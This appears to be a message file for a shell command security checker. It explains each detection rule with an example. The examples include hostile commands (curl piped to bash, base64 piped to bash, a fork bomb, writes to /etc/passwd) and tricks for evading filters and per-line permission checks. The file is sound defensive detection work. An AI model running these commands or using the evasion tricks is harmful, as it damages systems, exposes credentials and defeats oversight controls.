structuralExplain.PipeToShell: Network downloader (curl/wget/fetch) output piped directly to shell execution, e.g. curl http://x | bash
structuralExplain.CommandSubstitution: Command substitution $(...), backticks, or process substitution <()/>() for inline execution, e.g. echo $(whoami)
structuralExplain.SensitiveRedirect: Redirect writing to sensitive files/block devices (/etc/passwd, /dev/sda, etc.), e.g. echo x > /etc/passwd
structuralExplain.ForkBomb: Classic fork bomb — self-referencing function piped recursively and backgrounded to exhaust processes, e.g. :(){ :|:& };:
structuralExplain.Base64ToShell: Base64 decode (-d) output piped to shell execution, e.g. ... | base64 -d | bash

lexicalExplain.ControlChars: Contains non-printable control characters (0x00-0x1F, 0x7F) to bypass text filtering
lexicalExplain.UnicodeWhitespace: Contains Unicode whitespace (non-breaking space U+00A0, fullwidth space U+3000, etc.) disguised as regular spaces
lexicalExplain.IfsReference: References $IFS or ${...IFS}, using the separator variable to hide spaces and bypass filtering, e.g. cat$IFS/etc/passwd
lexicalExplain.AnsiCQuoting: Uses $'...' (ANSI-C quoting) or $"..." to obfuscate arguments
lexicalExplain.BackslashWhitespace: Uses backslash outside quotes to escape spaces and alter parsing boundaries
lexicalExplain.BackslashOperator: Uses backslash outside quotes to escape shell operators (semicolons/pipes/ampersands/redirects) to hide structure
lexicalExplain.EmbeddedNewline: Contains carriage return CR or newline to hide a second command
lexicalExplain.CommentQuoteDesync: Hash comment contains quote characters to disrupt quote state tracking
lexicalExplain.QuotedNewline: Newline inside quotes followed by hash comment line to bypass per-line permission checks
